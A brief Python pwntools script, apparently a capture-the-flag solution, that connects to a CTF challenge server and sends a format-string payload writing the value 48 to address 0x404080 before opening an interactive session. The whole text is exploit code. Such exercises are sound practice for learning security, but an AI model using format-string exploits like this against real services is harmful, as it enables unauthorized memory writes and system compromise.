from pwn import *

elf = ELF("format")
r = remote("challenges.ctfd.io", 30266)
vuln = {0x404080: 48}
r.sendline(fmtstr_payload(6, vuln))
r.interactive()
